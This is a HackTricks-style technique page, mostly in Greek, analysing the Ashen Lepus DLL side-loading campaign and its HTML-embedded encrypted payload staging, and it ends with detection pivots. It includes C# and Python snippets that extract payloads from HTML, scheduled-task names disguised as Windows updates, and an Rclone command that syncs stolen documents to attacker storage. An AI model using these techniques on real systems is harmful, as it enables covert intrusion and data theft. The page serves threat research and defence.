# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση τεχνικών

Ashen Lepus (aka WIRTE) εφάρμοσε ένα επαναλαμβανόμενο μοτίβο που συνδέει DLL sideloading, staged HTML payloads, και modular .NET backdoors για να διατηρήσει παρουσία σε διπλωματικά δίκτυα της Μέσης Ανατολής. Η τεχνική μπορεί να επαναχρησιμοποιηθεί από οποιονδήποτε χειριστή επειδή βασίζεται σε:

- **Archive-based social engineering**: αθώα PDF καθοδηγούν τους στόχους να κατεβάσουν ένα RAR αρχείο από έναν ιστότοπο κοινής χρήσης αρχείων. Το αρχείο περιέχει ένα εμφανώς νόμιμο document viewer EXE, μια κακόβουλη DLL με όνομα έμπιστης βιβλιοθήκης (π.χ., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), και ένα δολωμένο `Document.pdf`.
- **DLL search order abuse**: το θύμα κάνει διπλό κλικ στο EXE, τα Windows επιλύουν την εισαγωγή DLL από τον τρέχοντα κατάλογο, και ο κακόβουλος loader (AshenLoader) εκτελείται μέσα στην έμπιστη διαδικασία ενώ το δολωμένο PDF ανοίγει για να αποφευχθεί η υποψία.
- **Living-off-the-land staging**: κάθε επόμενο στάδιο (AshenStager → AshenOrchestrator → modules) παραμένει εκτός δίσκου μέχρι να χρειαστεί, παραδίδεται ως κρυπτογραφημένα blobs κρυμμένα μέσα σε διαφορετικά αβλαβή HTML responses.

## Αλληλουχία πλευρικής φόρτωσης πολλαπλών σταδίων

1. **Decoy EXE → AshenLoader**: το EXE side-loads το AshenLoader, το οποίο πραγματοποιεί host recon, το κρυπτογραφεί με AES-CTR και το αποστέλλει με POST μέσα σε εναλλασσόμενες παραμέτρους όπως `token=`, `id=`, `q=`, ή `auth=` προς μονοπάτια που μοιάζουν με API (π.χ. `/api/v2/account`).
2. **HTML extraction**: ο C2 αποκαλύπτει το επόμενο στάδιο μόνο όταν η IP του client γεωτοποθετηθεί στην στοχευμένη περιοχή και το `User-Agent` ταιριάζει με το implant, απογοητεύοντας sandboxes. Όταν οι έλεγχοι περάσουν, το σώμα HTTP περιέχει ένα `<headerp>...</headerp>` blob με το Base64/AES-CTR κρυπτογραφημένο AshenStager payload.
3. **Second sideload**: το AshenStager αναπτύσσεται μαζί με ένα άλλο νόμιμο binary που εισάγει το `wtsapi32.dll`. Η κακόβουλη αντιγραφή που εγχέεται στο binary ανακτά περισσότερη HTML, αυτή τη φορά εξάγοντας `<article>...</article>` για να ανακτήσει το AshenOrchestrator.
4. **AshenOrchestrator**: ένας modular .NET controller που αποκωδικοποιεί μια Base64 JSON config. Τα πεδία `tg` και `au` της config συγχωνεύονται/χαρτογραφούνται σε ένα AES κλειδί, το οποίο αποκρυπτογραφεί το `xrk`. Τα προκύπτοντα bytes λειτουργούν ως XOR key για κάθε module blob που ανακτάται στη συνέχεια.
5. **Module delivery**: κάθε module περιγράφεται μέσω σχολίων HTML που ανακατευθύνουν τον parser σε ένα αυθαίρετο tag, σπάζοντας στατικούς κανόνες που ψάχνουν μόνο για `<headerp>` ή `<article>`. Τα modules περιλαμβάνουν persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), και file exploration (`FE`).

### Πρότυπο ανάλυσης περιέκτη HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Ακόμα κι αν οι υπερασπιστές μπλοκάρουν ή αφαιρέσουν ένα συγκεκριμένο στοιχείο, ο χειριστής χρειάζεται μόνο να αλλάξει την ετικέτα που υποδεικνύεται στο σχόλιο HTML για να συνεχιστεί η παράδοση.

### Γρήγορο Βοηθητικό Εξαγωγής (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Παράλληλα αποφυγής HTML Staging

Πρόσφατη έρευνα για HTML smuggling (Talos) επισημαίνει payloads κρυμμένα ως Base64 strings μέσα σε `<script>` blocks σε HTML attachments και αποκωδικοποιούνται μέσω JavaScript κατά την εκτέλεση. Το ίδιο κόλπο μπορεί να επαναχρησιμοποιηθεί για C2 απαντήσεις: σταδιοποιήστε κρυπτογραφημένα blobs μέσα σε ένα script tag (ή άλλο στοιχείο DOM) και αποκωδικοποιήστε τα in-memory πριν από το AES/XOR, κάνοντας τη σελίδα να μοιάζει με κανονική HTML.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: οι τρέχοντες loaders ενσωματώνουν 256-bit κλειδιά μαζί με nonces (π.χ. `{9a 20 51 98 ...}`) και προαιρετικά προσθέτουν ένα επίπεδο XOR χρησιμοποιώντας συμβολοσειρές όπως `msasn1.dll` πριν/μετά την αποκρυπτογράφηση.
- **Infrastructure split + subdomain camouflage**: οι staging servers χωρίζονται ανά εργαλείο, φιλοξενούνται σε διαφορετικά ASNs και μερικές φορές μπροστά τους υπάρχουν υποτομείς με εμφάνιση νόμιμης δραστηριότητας, έτσι το καψάλισμα ενός stage δεν αποκαλύπτει τα υπόλοιπα.
- **Recon smuggling**: τα καταγεγραμμένα δεδομένα πλέον περιλαμβάνουν λίστες Program Files για εντοπισμό εφαρμογών υψηλής αξίας και κρυπτογραφούνται πάντα πριν εγκαταλείψουν τον host.
- **URI churn**: οι παράμετροι query και οι REST paths περιστρέφονται ανάμεσα σε καμπάνιες (`/api/v1/account?token=` → `/api/v2/account?auth=`), ακυρώνοντας εύθραυστες ανιχνεύσεις.
- **Gated delivery**: οι servers είναι geo-fenced και απαντούν μόνο σε πραγματικά implants. Μη εγκεκριμένοι clients λαμβάνουν μη ύποπτο HTML.

## Persistence & Execution Loop

Το AshenStager ρίχνει scheduled tasks που μιμούνται εργασίες συντήρησης των Windows και εκτελούνται μέσω του `svchost.exe`, π.χ.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Αυτές οι εργασίες επανεκκινούν την αλυσίδα sideloading κατά την εκκίνηση ή σε διαστήματα, διασφαλίζοντας ότι το AshenOrchestrator μπορεί να αιτηθεί νέα modules χωρίς να αγγίξει ξανά τον δίσκο.

## Using Benign Sync Clients for Exfiltration

Οι operators τοποθετούν diplomatic documents στο `C:\Users\Public` (world-readable και μη ύποπτο) μέσω ενός ειδικού module, και στη συνέχεια κατεβάζουν το νόμιμο [Rclone](https://rclone.org/) binary για να συγχρονίσουν αυτόν τον φάκελο με το attacker storage. Το Unit42 σημειώνει ότι αυτή είναι η πρώτη φορά που αυτός ο actor έχει παρατηρηθεί να χρησιμοποιεί Rclone για exfiltration, ευθυγραμμιζόμενο με την ευρύτερη τάση κατάχρησης νόμιμων sync εργαλείων για να ενταχθούν στην κανονική κίνηση:

1. **Stage**: αντιγραφή/συλλογή των στοχευμένων αρχείων στο `C:\Users\Public\{campaign}\`.
2. **Configure**: αποστολή ενός Rclone config που δείχνει σε attacker-controlled HTTPS endpoint (π.χ. `api.technology-system[.]com`).
3. **Sync**: εκτέλεση `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` έτσι ώστε η κίνηση να μοιάζει με κανονικά cloud backups.

Επειδή το Rclone χρησιμοποιείται ευρέως για νόμιμες ροές backup, οι defenders πρέπει να επικεντρωθούν σε ανωμαλίες εκτέλεσης (νέα binaries, παράξενοι remotes, ή ξαφνικός συγχρονισμός του `C:\Users\Public`).

## Detection Pivots

- Ειδοποιήσεις για **signed processes** που απρόσμενα φορτώνουν DLLs από user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), ειδικά όταν τα ονόματα των DLL επικαλύπτονται με `netutils`, `srvcli`, `dwampi`, ή `wtsapi32`.
- Επιθεώρηση ύποπτων HTTPS responses για **μεγάλα Base64 blobs ενσωματωμένα μέσα σε ασυνήθιστα tags** ή προστατευμένα από σχόλια `<!-- TAG: <xyz> -->`.
- Επεκτείνετε το hunting σε **Base64 strings μέσα σε `<script>` blocks** (HTML smuggling-style staging) που αποκωδικοποιούνται μέσω JavaScript πριν την επεξεργασία AES/XOR.
- Κυνηγήστε **scheduled tasks** που τρέχουν `svchost.exe` με μη-υπηρεσιακά arguments ή δείχνουν πίσω σε dropper directories.
- Παρακολουθήστε για **Rclone** binaries που εμφανίζονται εκτός IT-managed τοποθεσιών, νέα αρχεία `rclone.conf`, ή sync jobs που τραβάνε από staging directories όπως `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
